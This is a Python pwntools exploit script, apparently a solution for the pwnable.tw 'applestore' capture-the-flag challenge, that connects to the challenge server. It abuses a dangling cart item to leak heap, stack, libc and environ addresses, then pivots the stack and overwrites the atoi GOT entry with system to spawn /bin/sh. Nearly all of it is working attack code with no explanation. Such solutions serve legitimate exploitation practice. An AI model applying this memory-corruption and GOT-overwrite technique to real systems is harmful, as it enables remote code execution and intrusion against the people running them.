#!/usr/bin/env python3

from pwn import *

exe = ELF("./applestore_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

r = None
debug = 0


# mycart located @ 0x0804b068

def conn():
    global debug
    global r
    global libc
    global exe
    if debug:
        r = process("./applestore_patched")
    else:
        libc = ELF("./libc_32.so.6")
        exe = ELF("./applestore")
        r = remote("chall.pwnable.tw", 10104)

def add(idx):
    r.sendafter(b">", b"2")
    r.sendafter(b"Device Number>", str(idx).encode())
    r.recvuntil(b"idea.")

def create_cart_item(data, price, next_item, prev_item):
    return flat(data, price, next_item, prev_item)

conn()

for i in range(18):
    add(1)

for i in range(2):
    add(2)

for i in range(6):
    add(3)

r.sendafter(b">", b"5")
r.sendafter(b">", b"y")

# leak the stack
#r.sendafter(b">", b"3")
#r.sendafter(b">", b"27")
#r.recvuntil(b"Remove 27:")
#log.info(f"[STACK LEAK]: {hex(stack_leak)}")

# leak address of first cart item
mycart = 0x0804b068

r.sendafter(b">", b"4")
r.sendafter(b">", b"yy" + p32(mycart + 8)*3)

r.recvuntil(b"27: ")
cart_item0 =  int.from_bytes( r.recv(4), "little" )
log.info(f"[LEAK CART ITEM #0 ADDRESS]: {hex(cart_item0)}")

# leak stack address
# stack leak is 0x3f0 away from first cart item
r.sendafter(b">", b"4")
r.sendafter(b">", b"yy" + p32(cart_item0 + 0x3f0) + p32(mycart+8)*2)

r.recvuntil(b"27: ")
stack_leak =  int.from_bytes( r.recv(4), "little" )
log.info(f"[STACK LEAK]: {hex(stack_leak)}")

# leak libc
r.sendafter(b">", b"4")
r.sendafter(b">", b"yy" + p32(exe.got["puts"]) + p32(0)*3)
r.recvuntil(b"27: ")
libc_leak = u32(r.recv(4))
log.info(f"[LIBC LEAK]: {hex(libc_leak)}")

# calculate libc base
libc_addr = libc_leak - libc.symbols["puts"]
log.info(f"[LIBC ADDRESS]: {hex(libc_addr)}")

libc.address = libc_addr

# leak environ
r.sendafter(b">", b"4")
r.sendafter(b">", b"yy" + p32(libc.symbols["environ"]) + p32(0)*3)
r.recvuntil(b"27: ")

environ_leak = int.from_bytes(r.recv(4),"little") 
log.info(f"[ENVIRON() ADDRESS]: {hex(environ_leak)}")

# calculate ebp (ebp is 0x104 less than environ)
ebp = environ_leak - 0x104
log.info(f"[EBP ADDRESS]: {hex(ebp)}")

# find /bin/sh string
binsh = next(exe.search(b"==\x00"))

# overwrite ebp -> stack pivot
r.sendafter(b">", b"3")
r.sendafter(b">", b"27" + flat(binsh, 1, ebp-12, exe.got["atoi"]+0x22))
print("A")
r.sendafter(b">", flat(libc.symbols["system"],b";/bin/sh;"))
print("A")


r.interactive()

